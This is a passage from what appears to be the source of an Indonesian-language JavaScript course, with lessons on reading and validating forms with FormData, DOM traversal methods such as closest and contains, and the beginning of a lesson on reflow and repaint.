        "Keluaran di atas memuat pelajaran yang paling penting dari sub-bab ini. Centang yang **dicentang** muncul sebagai teks `'on'`, dan centang yang **tidak dicentang** tidak muncul sama sekali. Bukan `false`, bukan teks kosong, melainkan kuncinya benar-benar tidak ada. Itu perilaku standar HTML, bukan keanehan `FormData`, dan ia sama persis dengan yang dikirim formulir biasa ke server.",
      ),
      code(
        'js',
        `
        // Membaca dengan tipe yang benar, bukan mentah.
        function bacaFormAlamat(form) {
          const fd = new FormData(form);

          return {
            nama: String(fd.get('nama') ?? '').trim(),
            telepon: String(fd.get('telepon') ?? '').replace(/[^0-9+]/g, ''),
            provinsi: fd.get('provinsi') ?? '',
            kota: fd.get('kota') ?? '',
            // Kode pos TETAP teks. '40115' bukan angka, sebab nol di depan bisa hilang.
            kodePos: String(fd.get('kodePos') ?? '').trim(),
            alamat: String(fd.get('alamat') ?? '').trim(),
            catatan: String(fd.get('catatan') ?? '').trim(),
            // Centang: keberadaannya yang menentukan.
            jadikanUtama: fd.has('jadikanUtama'),
            // Beberapa nilai dengan nama yang sama, misalnya centang ganda.
            layanan: fd.getAll('layanan'),
          };
        }
        `,
        { filename: 'src/alamat/baca.js' },
      ),
      p(
        'Baris `kodePos` sengaja tidak diubah menjadi angka, dan itu keputusan yang sering keliru diambil. Kode pos Bandung `40115` memang terlihat seperti angka, tapi kode pos yang diawali nol seperti `01234` akan kehilangan nolnya begitu diubah menjadi `Number`. Aturan umumnya, sesuatu bertipe angka hanya kalau kamu akan **menghitung** dengannya. Nomor telepon, nomor rekening, dan kode pos semuanya adalah teks yang kebetulan berisi digit.',
      ),
      p(
        "`fd.has('jadikanUtama')` adalah cara yang benar membaca centang, sebab ia menanyakan keberadaan bukan nilai. Bandingkan dengan `fd.get('jadikanUtama') === 'on'` yang bekerja tapi bergantung pada nilai bawaan yang bisa diubah lewat atribut `value`. `has` benar untuk kedua kasus. Sementara `getAll` dipakai saat beberapa kolom berbagi satu nama, misalnya sekelompok centang layanan pengiriman.",
      ),
      code(
        'js',
        `
        // Validasi bawaan peramban, sebelum menulis satu baris validasi sendiri.
        const kotak = form.elements.telepon;

        kotak.setCustomValidity('');                 // bersihkan pesan lama dulu
        if (!/^[0-9+]{9,15}$/.test(kotak.value)) {
          kotak.setCustomValidity('Telepon 9 sampai 15 digit, boleh diawali tanda tambah');
        }

        if (!form.checkValidity()) {
          form.reportValidity();                     // tampilkan pesan bawaan peramban
          return;
        }
        `,
        { caption: 'Pesan validasi muncul di tempat yang sudah dikenal pengguna.' },
      ),
      p(
        'Atribut HTML seperti `required`, `minlength`, `pattern`, dan `type="email"` sudah menyediakan validasi tanpa satu baris JavaScript, lengkap dengan pesan berbahasa Indonesia yang mengikuti bahasa peramban. `setCustomValidity` menambahkan aturan yang tidak bisa dinyatakan atribut. Memanggilnya dengan teks kosong lebih dulu itu wajib, sebab pesan kustom yang tidak dibersihkan membuat kolomnya dianggap tidak sah selamanya.',
      ),
      callout(
        'danger',
        'Validasi di peramban adalah kenyamanan, bukan keamanan',
        'Seluruh atribut dan pemeriksaan di halaman bisa dilewati siapa pun yang mengirim permintaan langsung ke server. Aturan project ini menyebutnya tegas, yaitu validasi klien hanya untuk pengalaman pengguna dan server wajib memeriksa ulang semuanya. Jangan pernah memakai `pattern` sebagai satu-satunya penjaga bentuk data.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Formulir menghasilkan sedikit error dan banyak nilai yang salah diam-diam. Pesan pertama diverifikasi di Chromium sungguhan.',
      ),
      code(
        'text',
        `
        document.getElementById('f').submit();
                                     ^

        TypeError: document.getElementById(...).submit is not a function
        `,
        { caption: 'Ada kolom bernama `submit` di dalam formulirnya.' },
      ),
      p(
        'Elemen formulir bisa diakses lewat namanya sebagai properti, dan `<input name="submit">` menimpa method `form.submit`. Hal yang sama terjadi untuk nama `action`, `method`, `id`, `length`, dan `reset`. Hindari nama-nama itu untuk kolom. Kalau sebuah API pihak ketiga memaksa memakainya, panggil methodnya lewat prototipe dengan `HTMLFormElement.prototype.submit.call(form)`.',
      ),
      code(
        'text',
        `
        const fd = new FormData(form);
        console.log([...fd.entries()]);

        [["nama","Sari"],["setuju","on"],["kota","bdg"]]
        `,
        { caption: 'Kolom yang tidak punya atribut `name` tidak pernah muncul.' },
      ),
      p(
        '`FormData` hanya mengumpulkan kolom yang punya atribut `name`, dan atribut `id` tidak menggantikannya. Ini penyebab bug yang sangat sering, yaitu kolom yang jelas terlihat di halaman dan jelas diisi pengguna ternyata tidak pernah sampai ke server. Tidak ada error dan tidak ada peringatan. Kalau sebuah nilai hilang, hal pertama yang diperiksa adalah apakah kolomnya punya `name`.',
      ),
      code(
        'text',
        `
        const jumlah = form.elements.jumlah.value;
        const total = jumlah * harga;

        // jumlah bernilai '2', bukan 2.
        // Untungnya * memaksa menjadi angka. Tapi + tidak.
        const salah = jumlah + 1;    // '21'
        `,
        { caption: 'Seluruh nilai dari formulir bertipe teks.' },
      ),
      p(
        'Ini pengingat dari Bab 1 yang muncul kembali di tempat paling sering terjadi. Bahkan `<input type="number">` mengembalikan teks lewat `.value`. Ada properti `.valueAsNumber` yang mengembalikan angka sungguhan atau `NaN`, dan itu pilihan yang lebih baik untuk kolom angka. Untuk kolom tanggal, ada `.valueAsDate` yang mengembalikan object `Date`.',
      ),
      code(
        'text',
        `
        kotak.setCustomValidity('Terlalu pendek');
        // pengguna memperbaiki isinya
        form.checkValidity();

        false
        `,
        { caption: 'Pesan kustom yang tidak dibersihkan membuat kolomnya tidak sah selamanya.' },
      ),
      p(
        'Pesan kustom bertahan sampai kamu menggantinya dengan teks kosong. Karena itu urutan yang benar selalu bersihkan dulu lalu periksa lagi, bukan hanya menetapkan saat gagal. Gejalanya khas, yaitu tombol kirim tetap tidak berfungsi walaupun seluruh kolom sudah terlihat benar, dan pesan lama masih muncul saat tombol ditekan.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`form.submit is not a function`',
            'Ada kolom bernama `submit` yang menimpa methodnya',
            'Ganti nama kolomnya, atau panggil lewat prototipe',
          ],
          [
            'Nilai kolom tidak muncul di `FormData`',
            'Kolomnya tidak punya atribut `name`',
            'Tambahkan `name`, sebab `id` tidak menggantikannya',
          ],
          [
            'Centang yang tidak dicentang tidak ada kuncinya',
            'Itu perilaku standar HTML',
            'Pakai `fd.has(nama)` untuk membaca centang',
          ],
          [
            'Angka dari formulir digabung sebagai teks',
            'Seluruh nilai formulir bertipe teks',
            'Pakai `.valueAsNumber`, atau ubah dengan `Number` lalu periksa `Number.isNaN`',
          ],
          [
            'Formulir tetap dianggap tidak sah setelah diperbaiki',
            'Pesan kustom tidak pernah dibersihkan',
            "Panggil `setCustomValidity('')` sebelum memeriksa ulang",
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Formulir adalah tempat data pengguna masuk ke sistemmu, dan hampir semua kesalahan di bawah berakhir sebagai data yang salah tersimpan.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Membaca tiap kolom satu per satu dengan `getElementById`',
            'Jelas terlihat kolom mana yang dibaca',
            'Dua puluh baris untuk hal yang bisa satu baris, dan setiap kolom baru menuntut satu baris lagi. `FormData` membacanya sekaligus dengan aturan yang sama seperti peramban',
          ],
          [
            'Menyimpan nomor telepon dan kode pos sebagai angka',
            'Isinya kan digit semua',
            'Nol di depan hilang, dan nomor yang panjang bisa kehilangan ketepatan. Simpan sebagai teks, sebab kamu tidak akan menghitung dengannya',
          ],
          [
            'Mengganti pesan validasi bawaan dengan pesan sendiri di semua tempat',
            'Supaya seragam dengan desain',
            'Pesan bawaan sudah diterjemahkan mengikuti bahasa peramban dan sudah dibacakan pembaca layar dengan benar. Ganti hanya kalau memang butuh aturan yang tidak bisa dinyatakan atribut',
          ],
          [
            'Menampilkan satu pesan galat umum di atas formulir',
            'Cukup memberi tahu ada yang salah',
            'Pengguna harus mencari sendiri kolom mana yang bermasalah. Tampilkan pesan di sebelah kolomnya, dan hubungkan dengan `aria-describedby`',
          ],
          [
            'Mengosongkan formulir setelah pengiriman gagal',
            'Supaya pengguna mengisi ulang dengan benar',
            'Kehilangan data yang sudah diketik adalah kegagalan pengalaman pengguna yang paling menyakitkan sekaligus paling mudah dihindari. Pertahankan isinya',
          ],
          [
            'Tidak menonaktifkan tombol kirim selama permintaan berjalan',
            'Pengguna toh menunggu',
            'Pada jaringan lambat pengguna akan menekan lagi, dan pesanannya terkirim dua kali. Matikan tombolnya, dan tetap sediakan kunci idempoten di server',
          ],
        ],
      ),
      p(
        'Baris kelima adalah yang paling sering dikeluhkan pengguna sungguhan, dan ia sepenuhnya bisa dihindari. Kalau pengiriman gagal, biarkan seluruh isi formulir apa adanya lalu tampilkan pesan yang menyebutkan apa yang perlu diperbaiki. Untuk formulir panjang, pertimbangkan menyimpan isinya ke penyimpanan peramban sambil diketik, sehingga tab yang tertutup tidak berarti pekerjaan hilang.',
      ),
      callout(
        'tip',
        'Manfaatkan atribut sebelum menulis validasi sendiri',
        'Atribut `required`, `type="email"`, `minlength`, `maxlength`, `min`, `max`, `step`, `pattern`, dan `inputmode` menutup sebagian besar kebutuhan tanpa satu baris JavaScript. Atribut `autocomplete` juga sering dilupakan, padahal ia yang membuat peramban dan pengelola kata sandi bisa mengisi otomatis. Menulis semuanya di HTML membuat formulirnya tetap berguna bahkan sebelum JavaScript selesai dimuat.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'Pasang `submit` pada `<form>`, bukan pada tombolnya.',
        '`FormData` hanya membaca input yang punya `name`.',
        'Validasi bawaan HTML sudah membawa pesan yang diterjemahkan — pakai sebelum menulis sendiri.',
        'Error di dekat fieldnya, terhubung `aria-describedby`, dan fokus ke yang pertama gagal.',
        'Validasi klien adalah UX; kontrol keamanannya di server.',
      ),
      references(
        {
          label: 'FormData',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/FormData',
          source: 'MDN',
          note: 'Menegaskan bahwa hanya input dengan atribut `name` yang ikut terbaca.',
        },
        {
          label: 'Client-side form validation',
          href: 'https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Forms/Form_validation',
          source: 'MDN',
          note: 'Termasuk peringatan resmi bahwa validasi klien bukan kontrol keamanan.',
        },
        {
          label: 'Constraint Validation API',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTML/Guides/Constraint_validation',
          source: 'MDN',
          note: 'Validasi bawaan HTML yang pesannya otomatis mengikuti bahasa perangkat pengguna.',
        },
        {
          label: 'HTML attribute: autocomplete',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/autocomplete',
          source: 'MDN',
          note: 'Daftar lengkap nilai yang membuat pengisian otomatis benar-benar bekerja.',
        },
        {
          label: 'Input Validation Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Alasan keamanan di balik aturan "validasi klien untuk UX, validasi server untuk keamanan".',
        },
      ),
    ],
  ),

  written(
    'traversal-dom',
    'Menelusuri DOM',
    20,
    'Bergerak dari satu elemen ke tetangganya, induknya, atau anaknya.',
    [
      terms(
        {
          term: 'traversal',
          meaning:
            'Dibaca "tra-ver-sal", terjemahannya **penelusuran**. Bergerak dari satu node ke node lain di dalam pohon DOM — naik ke induk, turun ke anak, atau menyamping ke saudara. Dipakai ketika kamu sudah memegang satu elemen dan butuh elemen lain yang posisinya berhubungan dengannya.',
        },
        {
          term: 'parent',
          meaning:
            'Terjemahannya **induk**. Node yang berada satu tingkat di atas. Pakai `parentElement` dan bukan `parentNode` — keduanya hampir selalu sama, kecuali di puncak pohon, dan versi `Element` lebih jarang memberi kejutan.',
        },
        {
          term: 'child',
          meaning:
            'Terjemahannya **anak**. Node yang berada langsung di dalam sebuah elemen. Perhatikan pembedaan penting: `children` hanya berisi **elemen**, sementara `childNodes` juga menghitung teks dan komentar.',
        },
        {
          term: 'sibling',
          meaning:
            'Terjemahannya **saudara**. Node yang berbagi induk yang sama. `nextElementSibling` mengambil saudara berikutnya, `previousElementSibling` yang sebelumnya.',
        },
        {
          term: 'descendant',
          meaning:
            'Terjemahannya **keturunan**. Semua node yang berada di dalam sebuah elemen, berapa pun tingkat kedalamannya — bukan hanya anak langsungnya. `querySelector` mencari di antara seluruh keturunan.',
        },
        {
          term: 'firstChild vs firstElementChild',
          meaning:
            'Pembedaan yang paling sering menjebak. Pada HTML yang diindentasi rapi, `firstChild` biasanya adalah **text node berisi spasi dan baris baru**, bukan elemen pertama yang kamu lihat. Selalu pakai `firstElementChild` kecuali kamu memang sedang mengurus teks.',
        },
        {
          term: 'closest',
          meaning:
            'Menelusuri **ke atas** mencari elemen terdekat yang cocok dengan selector, dimulai dari elemen itu sendiri. Mengembalikan `null` kalau sampai ke akar dokumen tidak ada yang cocok. Pasangan wajib event delegation dari sub-bab sebelumnya.',
        },
        {
          term: 'matches',
          meaning:
            'Menjawab pertanyaan **"apakah elemen ini cocok dengan selector tersebut?"** dengan `true` atau `false`, tanpa menelusuri ke mana pun. Berguna untuk menyaring di dalam pendengar delegation: `if (!e.target.matches("[data-aksi]")) return;`.',
        },
        {
          term: 'contains',
          meaning:
            'Menjawab apakah sebuah node berada **di dalam** node lain. Pemakaian paling umum: mendeteksi klik di luar sebuah menu, dengan `if (!menu.contains(e.target)) tutupMenu()`.',
        },
      ),

      h2('Element vs Node'),
      code(
        'js',
        `
        // Versi 'Element' mengabaikan text node — hampir selalu yang kamu mau
        el.parentElement;              vs   el.parentNode;
        el.children;                   vs   el.childNodes;
        el.firstElementChild;          vs   el.firstChild;
        el.nextElementSibling;         vs   el.nextSibling;
        el.previousElementSibling;     vs   el.previousSibling;
        `,
      ),
      p(
        'Kelima pasangan itu mengikuti **satu pola penamaan yang sama**, jadi tidak perlu dihafal satu per satu. Yang memuat kata `Element` hanya melihat elemen, sedangkan sisanya melihat semua jenis node termasuk teks dan komentar. Karena teks pun sebuah node, kenyataan yang sudah kamu temui di sub-bab pertama bab ini, versi tanpa `Element` hampir selalu memberi hasil yang mengejutkan pada HTML yang diindentasi rapi. `nextSibling` dari sebuah `<li>` biasanya berupa potongan spasi dan baris baru, bukan `<li>` berikutnya. `parentNode` adalah satu-satunya pasangan yang jarang berbeda hasilnya, karena induk sebuah elemen memang hampir selalu elemen juga. Aturan praktisnya cukup satu, yaitu **pilih versi `Element`** kecuali kamu memang sedang bekerja dengan teks.',
      ),
      callout(
        'warning',
        '`firstChild` sering bukan yang kamu kira',
        'Pada HTML yang diindentasi, `firstChild` biasanya adalah **text node berisi spasi dan baris baru**, bukan elemen pertama. Pakai `firstElementChild`.',
      ),

      h2('`closest` — naik sampai ketemu'),
      code(
        'js',
        `
        // Dari titik klik, naik sampai menemukan yang cocok (termasuk dirinya sendiri)
        e.target.closest('[data-id]');
        e.target.closest('li');
        e.target.closest('form');

        // null kalau tidak ada sampai akar dokumen
        `,
      ),
      p(
        '`closest` adalah pasangan wajib event delegation, dan salah satu method DOM yang paling sering terpakai.',
      ),

      h2('Memeriksa hubungan'),
      code(
        'js',
        `
        wadah.contains(el);              // true kalau el di dalam wadah (atau el === wadah)
        el.matches('.aktif');            // true kalau el cocok dengan selector

        // Pola "klik di luar" — untuk menutup dropdown
        document.addEventListener('click', (e) => {
          if (!dropdown.contains(e.target)) tutup();
        });
        `,
      ),
      p(
        'Perbedaan keduanya terletak pada arah pertanyaannya. `contains` menanyakan **hubungan antara dua elemen**, yaitu apakah yang satu berada di dalam yang lain, dan perhatikan ia juga menjawab `true` ketika keduanya elemen yang sama. `matches` tidak menelusuri ke mana pun, karena ia hanya menanyakan apakah satu elemen cocok dengan sebuah selector, dan itu membuatnya berguna sebagai penyaring cepat di awal listener delegation. Contoh di bawahnya adalah pola "klik di luar" yang benar, dan layak dibandingkan dengan jebakan `stopPropagation` di sub-bab bubbling. Alih-alih menghentikan perjalanan event supaya listener global tidak terpicu, di sini listener globalnya sendiri yang **memeriksa** apakah klik jatuh di dalam dropdown. Efeknya lokal, tidak memutus perilaku komponen lain, dan tidak menimbulkan bug jarak jauh.',
      ),

      h2('Mencari ke bawah'),
      code(
        'js',
        `
        kartu.querySelector('.judul');       // pertama di dalam kartu
        kartu.querySelectorAll('button');    // semua di dalam kartu

        [...daftar.children];                // anak langsung saja
        `,
      ),
      p(
        "Dua baris pertama adalah `querySelector` yang sudah kamu kenal, hanya dipanggil pada sebuah elemen alih-alih pada `document`, dan seperti dibahas di sub-bab seleksi, pembatasan itulah yang mencegah kode mengambil elemen milik kartu lain. Perlu diingat keduanya mencari **sampai ke kedalaman berapa pun** di dalam wadahnya, jadi `kartu.querySelectorAll('button')` juga menemukan tombol yang bersarang di dalam tombol lain. Baris terakhir sengaja berbeda, sebab `daftar.children` hanya berisi **anak langsung**, satu tingkat saja, dan itu yang kamu inginkan ketika sedang menelusuri baris-baris sebuah daftar tanpa ikut terseret ke isi tiap barisnya. Spread `[...]` di depannya dipakai karena `children` juga bukan array, persis seperti alasan pada `NodeList`.",
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Komponen tabel yang bisa diurutkan punya baris kepala dengan tombol di tiap kolom. Saat sebuah kolom diklik, kamu perlu tahu kolom keberapa itu supaya bisa mengurutkan berdasarkan kolom yang benar. Kamu menulis `tombol.parentElement.parentElement` untuk naik ke barisnya, dan itu bekerja. Dua minggu kemudian desainer membungkus tiap kolom dengan satu `div` untuk keperluan tata letak, dan seluruh pengurutan rusak.',
      ),
      p(
        'Penelusuran pohon adalah bagian DOM yang paling mudah dipakai dengan cara yang rapuh. Perbandingan di bawah menunjukkan bentuk yang tahan perubahan.',
      ),
      code(
        'js',
        `
        // RAPUH: terikat pada jumlah tingkat yang persis.
        const baris = tombol.parentElement.parentElement;
        const indeks = [...baris.children].indexOf(tombol.parentElement);

        // TAHAN: naik sampai menemukan yang bertanda, berapa pun tingkatnya.
        const sel = tombol.closest('th');
        const baris2 = tombol.closest('tr');
        const indeks2 = sel.cellIndex;          // properti bawaan untuk sel tabel
        `,
        { caption: 'Satu pembungkus tambahan merusak yang kiri dan tidak menyentuh yang kanan.' },
      ),
      p(
        '`closest` menelusuri ke atas dan berhenti pada yang pertama cocok, termasuk elemen itu sendiri. Karena ia mencari berdasarkan pemilih dan bukan berdasarkan jumlah langkah, menambah atau menghapus pembungkus tidak berpengaruh sama sekali. Ini alasan `closest` menjadi satu-satunya cara naik yang layak dipakai di kode baru.',
      ),
      code(
        'js',
        `
        // Kasus nyata kedua: menu yang menutup saat diklik di luar.
        document.addEventListener('click', (peristiwa) => {
          for (const menu of document.querySelectorAll('[data-menu][open]')) {
            const pemicu = document.querySelector(\`[data-menu-untuk="\${menu.id}"]\`);

            // contains menjawab: apakah yang diklik berada DI DALAM menu atau pemicunya?
            const diDalam = menu.contains(peristiwa.target)
              || pemicu?.contains(peristiwa.target);

            if (!diDalam) menu.removeAttribute('open');
          }
        });
        `,
        { filename: 'src/menu.js' },
      ),
      p(
        '`contains` menjawab pertanyaan apakah sebuah node berada di dalam node lain, pada kedalaman berapa pun, dan ia juga bernilai benar untuk node itu sendiri. Ini pasangan alami dari `closest`, yaitu satu menelusuri ke atas dan satu memeriksa hubungan. Pola menutup saat klik di luar ini muncul di hampir setiap aplikasi, dan menulisnya dengan perbandingan `===` pada elemen tertentu akan gagal begitu pengguna mengklik ikon di dalam menu.',
      ),
      code(
        'js',
        `
        // Perbedaan yang wajib dihafal, sebab keduanya terlihat mirip.
        wadah.childNodes;             // SEMUA node: elemen, teks, komentar
        wadah.children;               // hanya elemen

        wadah.firstChild;             // sering berupa node teks berisi spasi
        wadah.firstElementChild;      // elemen pertama sungguhan

        el.nextSibling;               // sering berupa node teks
        el.nextElementSibling;        // elemen berikutnya sungguhan

        // HTML yang ditulis rapi selalu punya spasi di antara tag:
        // <div>
        //   <p>satu</p>
        // </div>
        // wadah.childNodes.length -> 3, bukan 1
        `,
        { caption: 'Spasi dan baris baru di HTML menjadi node teks di DOM.' },
      ),
      p(
        'Ini penyebab bug yang membingungkan saat orang pertama kali menelusuri pohon secara manual. HTML yang ditulis dengan indentasi rapi menghasilkan node teks di antara tiap tag, sehingga `firstChild` hampir selalu berupa teks kosong bukan elemen yang kamu maksud. Aturan praktisnya, versi yang menyebut kata `Element` adalah yang kamu butuhkan hampir selalu.',
      ),
      p(
        'Perlu ditambahkan, sebagian besar penelusuran manual bisa dihindari sama sekali. Kalau kamu menemukan diri menulis rantai `nextElementSibling` sepanjang tiga langkah, biasanya ada pemilih yang menyatakan maksud yang sama secara langsung, misalnya `[data-peran="isi"]`. Penelusuran manual paling tepat dipakai untuk hubungan yang memang struktural, seperti sel di dalam baris tabel.',
      ),
      callout(
        'tip',
        'Tabel punya properti penelusuran sendiri yang lebih jelas',
        'Elemen tabel menyediakan `rows`, `cells`, `rowIndex`, dan `cellIndex` yang menghitung dengan benar termasuk saat ada `thead` dan `tbody`. Memakainya jauh lebih terbaca daripada menghitung sendiri dengan `indexOf` pada `children`, dan lebih tahan terhadap perubahan struktur.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Penelusuran pohon jarang melempar. Yang muncul adalah `null` yang merambat, dan node teks yang tidak terduga.',
      ),
      code(
        'text',
        `
        const baris = tombol.parentElement.parentElement.parentElement;
        baris.dataset.id;
             ^

        TypeError: Cannot read properties of null (reading 'dataset')
        `,
        { caption: 'Naik lebih banyak daripada tingkat yang tersedia.' },
      ),
      p(
        'Setiap `parentElement` bisa menghasilkan `null` begitu sampai di atas `html`, dan rantai yang terlalu panjang akan melewatinya. Yang menyesatkan, pesan errornya menyebut `dataset` sehingga orang mencari masalah pada atribut data padahal masalahnya pada rantai naiknya. Ganti seluruh rantai dengan satu `closest`, dan tambahkan penjaga karena `closest` juga bisa mengembalikan `null`.',
      ),
      code(
        'text',
        `
        const pertama = wadah.firstChild;
        pertama.classList.add('aktif');
                ^

        TypeError: pertama.classList is undefined
        `,
        { caption: '`firstChild` berupa node teks, bukan elemen.' },
      ),
      p(
        'Node teks tidak punya `classList`, tidak punya `dataset`, dan tidak punya `querySelector`. Bug ini punya sifat yang khas, yaitu ia muncul dan hilang tergantung bagaimana HTML-nya ditulis. HTML yang seluruh tagnya berdempetan tanpa spasi tidak menghasilkan node teks, sehingga kodenya bekerja. Begitu ada yang merapikan indentasinya, kodenya rusak. Pakai `firstElementChild`.',
      ),
      code(
        'text',
        `
        const sel = tombol.closest('.kolom');
        console.log(sel.dataset.kunci);
                    ^

        TypeError: Cannot read properties of null (reading 'dataset')
        `,
        { caption: '`closest` tidak menemukan apa pun sampai ke akar.' },
      ),
      p(
        '`closest` mengembalikan `null` kalau tidak ada leluhur yang cocok, dan itu perilaku yang benar. Kalau kamu memakainya di dalam penangan delegasi, hasil `null` justru sering terjadi, misalnya saat pengguna mengklik area kosong. Selalu tulis penjaga `if (!sel) return` setelahnya, dan itu sudah menjadi bagian dari pola delegasi di Sub-bab 4.8.',
      ),
      code(
        'text',
        `
        console.log(wadah.childNodes.length);   // 3
        console.log(wadah.children.length);     // 1

        // HTML-nya hanya berisi satu paragraf.
        `,
        { caption: 'Dua node teks berisi spasi ikut terhitung.' },
      ),
      p(
        'Selisih dua itu berasal dari spasi dan baris baru sebelum dan sesudah paragrafnya. Kalau kamu menghitung jumlah anak untuk keperluan apa pun, misalnya menentukan apakah daftar kosong, pakai `children.length`. Memakai `childNodes.length` menghasilkan daftar yang tidak pernah terlihat kosong walaupun tidak ada satu pun elemen di dalamnya.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`Cannot read properties of null` setelah rantai `parentElement`',
            'Naik melewati akar pohon',
            'Ganti dengan satu `closest`, lalu beri penjaga',
          ],
          [
            '`classList is undefined` pada `firstChild`',
            'Yang didapat node teks berisi spasi',
            'Pakai `firstElementChild`',
          ],
          [
            '`closest` mengembalikan `null`',
            'Tidak ada leluhur yang cocok, sering karena klik di area kosong',
            'Tulis `if (!el) return` setelahnya',
          ],
          [
            'Jumlah anak lebih banyak daripada yang terlihat',
            'Node teks dari indentasi ikut terhitung',
            'Pakai `children` bukan `childNodes`',
          ],
          [
            'Kode bekerja lalu rusak setelah HTML dirapikan',
            'Kode bergantung pada ketiadaan node teks',
            'Pakai versi yang menyebut `Element` pada seluruh penelusuran',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Penelusuran pohon adalah tempat kode frontend paling mudah menjadi rapuh terhadap perubahan tampilan, dan hampir seluruh baris di bawah adalah tentang mengurangi ketergantungan pada struktur.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Merangkai `parentElement` beberapa kali',
            'Strukturnya sudah pasti dan tidak akan berubah',
            'Struktur berubah setiap kali ada penyesuaian tata letak. Pakai `closest` dengan pemilih yang menyatakan maksud',
          ],
          [
            'Memakai `childNodes` untuk menelusuri anak',
            'Namanya paling langsung',
            'Node teks dari indentasi ikut masuk. Pakai `children`',
          ],
          [
            'Memakai `nth-child` di pemilih untuk menunjuk kolom tertentu',
            'Posisinya memang tetap',
            'Menambah satu kolom menggeser semuanya. Tandai kolomnya dengan atribut data',
          ],
          [
            'Menelusuri seluruh pohon dengan rekursi untuk mencari sesuatu',
            'Cara paling langsung dipikirkan',
            '`querySelectorAll` melakukannya jauh lebih cepat dan dalam satu baris. Rekursi manual hanya perlu untuk kasus yang tidak bisa dinyatakan sebagai pemilih',
          ],
          [
            'Membaca `parentNode` alih-alih `parentElement`',
            'Keduanya terdengar sama',
            '`parentNode` dari elemen `html` adalah `document`, bukan `null`, sehingga pemeriksaan berhenti bisa keliru. `parentElement` lebih dapat diprediksi',
          ],
          [
            'Mencari elemen dari `document` padahal sudah berada di dalam sebuah baris',
            'Hasilnya kan sama',
            'Bisa menemukan elemen dari baris lain yang kelasnya sama. Cari dari elemen barisnya, bukan dari dokumen',
          ],
        ],
      ),
      p(
        'Baris pertama layak dijadikan aturan pribadi tanpa pengecualian. Setiap kali kamu menulis `parentElement` lebih dari satu kali berturut-turut, ganti dengan `closest` dan sebuah atribut data. Perubahannya memakan waktu sepuluh detik, dan ia menghilangkan seluruh kelas bug yang muncul setiap kali ada orang lain menyentuh tata letak.',
      ),
      callout(
        'info',
        'Kalau penelusurannya rumit, biasanya strukturnya yang perlu diperbaiki',
        'Kode yang butuh naik tiga tingkat lalu turun dua tingkat untuk menemukan sesuatu adalah tanda bahwa hubungan antar-elemennya tidak dinyatakan di HTML. Menambahkan satu atribut data yang menyatakan hubungan itu hampir selalu lebih murah daripada mempertahankan penelusuran yang rumit.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'Pakai versi `*Element*` — ia mengabaikan text node dari indentasi.',
        '`closest` naik sampai menemukan yang cocok; pasangan wajib event delegation.',
        '`contains` untuk memeriksa "apakah di dalam"; `matches` untuk "apakah cocok".',
        'Pola klik-di-luar dibangun dari `contains`, bukan dari `stopPropagation`.',
      ),
      references(
        {
          label: 'Element.children',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/children',
          source: 'MDN',
          note: 'Hanya berisi elemen — bandingkan dengan `childNodes` yang menghitung teks juga.',
        },
        {
          label: 'Node.firstChild',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Node/firstChild',
          source: 'MDN',
          note: 'Halaman ini sendiri memperingatkan soal text node dari indentasi.',
        },
        {
          label: 'Element.matches()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/matches',
          source: 'MDN',
          note: 'Penyaring ringkas di dalam pendengar event delegation.',
        },
        {
          label: 'Node.contains()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Node/contains',
          source: 'MDN',
          note: 'Dasar pola klik-di-luar yang jauh lebih baik daripada `stopPropagation`.',
        },
        {
          label: 'Traversing an HTML table with JavaScript',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Traversing_an_HTML_table_with_JavaScript_and_DOM_Interfaces',
          source: 'MDN',
          note: 'Contoh penelusuran DOM yang lebih panjang, langsung dari dokumentasi resmi.',
        },
      ),
    ],
  ),

  written(
    'performa-dom',
    'Performa: reflow, repaint, batching',
    23,
    'Kenapa manipulasi DOM bisa membuat halaman terasa berat — dan cara mengukurnya.',
    [
      terms(
        {
          term: 'reflow',
          meaning:
            'Disebut juga *layout*. Perhitungan ulang **posisi dan ukuran** seluruh elemen oleh browser. Ini langkah **paling mahal** dari ketiganya, karena mengubah ukuran satu elemen bisa menggeser semua elemen di sekitarnya, yang lalu menggeser elemen lain lagi.',
        },
        {
          term: 'repaint',
          meaning:
            'Disebut juga *paint*. Menggambar ulang **piksel** sebuah elemen tanpa mengubah posisinya — misalnya saat warnanya berubah. Lebih murah daripada reflow, tapi tetap bukan gratis.',
        },
        {
          term: 'composite',
          meaning:
            'Terjemahannya **menyusun lapisan**. Langkah terakhir yang menggabungkan lapisan-lapisan yang sudah digambar menjadi satu tampilan. **Paling murah** karena bisa dikerjakan GPU, dan hanya `transform` serta `opacity` yang bisa berhenti di langkah ini saja.',
        },
        {
          term: 'layout thrashing',
          meaning:
            'Terjemahan bebasnya **layout yang dihajar bolak-balik**. Pola membaca ukuran lalu menulis style, dibaca lagi lalu ditulis lagi, berulang-ulang di dalam loop. Setiap pembacaan **memaksa** browser menghitung ulang tata letak yang baru saja dibatalkan oleh penulisan sebelumnya. Ini penyebab lambat yang paling sering, dan kodenya terlihat sangat wajar.',
        },
        {
          term: 'forced synchronous layout',
          meaning:
